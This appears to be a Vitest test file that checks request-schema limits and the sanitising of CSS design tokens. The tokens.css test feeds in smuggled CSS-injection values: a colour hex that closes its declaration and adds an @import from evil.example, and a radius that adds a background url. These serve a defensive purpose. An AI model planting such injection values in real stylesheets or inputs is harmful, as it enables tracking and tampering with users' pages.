import { describe, expect, it } from "vitest";
import { renderTokensCss } from "@/lib/artifacts/render";
import { buildDemoBlueprint } from "@/lib/demos/preset";
import {
  analyzeVisualRequestSchema,
  blueprintRequestSchema,
  refineRequestSchema,
} from "@/lib/schema";

describe("schema payload limits", () => {
  it("rejects oversized refine currentContent", () => {
    const result = refineRequestSchema.safeParse({
      projectId: "project_test",
      fileName: "01_PRD.md",
      currentContent: "x".repeat(120_001),
      userQuery: "Tighten scope",
      blueprintJson: "{}",
    });
    expect(result.success).toBe(false);
  });

  it("requires screenshot fields together on blueprint requests", () => {
    const result = blueprintRequestSchema.safeParse({
      idea: "A simple todo app for students",
      answers: { user: "Student" },
      screenshotBase64: "a".repeat(30),
    });
    expect(result.success).toBe(false);
  });

  it("rejects unsupported screenshot mime types", () => {
    const result = analyzeVisualRequestSchema.safeParse({
      screenshotBase64: "a".repeat(30),
      screenshotMimeType: "image/svg+xml",
    });
    expect(result.success).toBe(false);
  });
});

describe("tokens.css safety", () => {
  it("falls back when visual tokens contain CSS injection", () => {
    const blueprint = buildDemoBlueprint("Aplikasi pencatat utang warung", {
      user: "Solo shop owner",
      job: "Record debt and mark it paid",
      auth: "demo_profile",
      data: "local_demo",
      constraint: "Three screens max in Phase 1",
    });

    blueprint.visual = {
      ...blueprint.visual!,
      colors: [
        {
          name: "Primary",
          hex: "#fff; } @import url('https://evil.example/track.css'); /*",
          role: "accent",
          source: "generated",
          confidence: 50,
          explanation: "malicious",
        },
      ],
      radii: {
        button: "12px; background: url(https://evil.example)",
        card: "18px",
        modal: "20px",
      },
    };

    const css = renderTokensCss(blueprint);
    expect(css).not.toContain("@import");
    expect(css).toContain("--accent: #2196F3;");
    expect(css).toContain("--radius-button: 12px;");
  });
});
